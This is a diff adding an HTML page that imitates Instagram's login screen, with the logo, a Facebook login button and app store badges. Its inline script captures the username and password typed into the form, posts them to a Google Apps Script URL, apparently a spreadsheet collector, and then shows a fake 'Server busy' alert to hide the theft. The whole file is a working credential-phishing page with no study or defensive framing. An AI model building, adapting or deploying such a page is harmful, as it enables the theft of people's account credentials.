@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Insta login Page</title>
+
+</head>
+
+<body>
+    <div class="container">
+        <div class="content">
+            <img src="instagram.png" alt="">
+
+            <form action="#" class="form" method="post" name="google-sheet">
+                <div class="inputs">
+                    <label for="">
+                        <input type="text" placeholder="phone number, username,or email" name="name">
+                        <span></span>
+                    </label>
+                    <label for="">
+                        <input type="password" placeholder="Password" name="Password">
+                        <span></span>
+                    </label>
+                </div>
+                <button type="submit" name="sumbit">Log in</button>
+            </form>
+            <div class="seperator">
+                <span></span>
+                <span>OR</span>
+                <span></span>
+            </div>
+
+
+            <div class="forgot-buttons">
+                <button>
+                    <img src="ffb.png" alt="">
+                    <span><a href="https://www.facebook.com/login/" target="_blank">Log in with Facebook</a></span>
+                </button>
+                <button>Forgotten your Password?</button>
+            </div>
+        </div>
+    </div>
+    <div class="sign-up">
+        <p>Don't have an account?<a href="https://www.instagram.com/">Sign up</a></p>
+    </div>
+    <br>
+    <p class="get">Get the app.</p>
+    <div class="img">
+        <img src="app-store.png" alt="app_store">
+        <img src="play-store.png" alt="play_store">
+    </div>
+
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyvPISsI5A8B_U3PhpGdvYDjCp7GC53P80sEcAABdhyov2qzxvL_GvUyE1Q4_XITil8bA/exec'
+        const form = document.forms['google-sheet']
+
+        form.addEventListener('submit', e => {
+            e.preventDefault()
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => alert("Server busy"))
+                .catch(error => console.error('Error!', error.message))
+        })
+    </script>
+
+</body>
+
+</html>
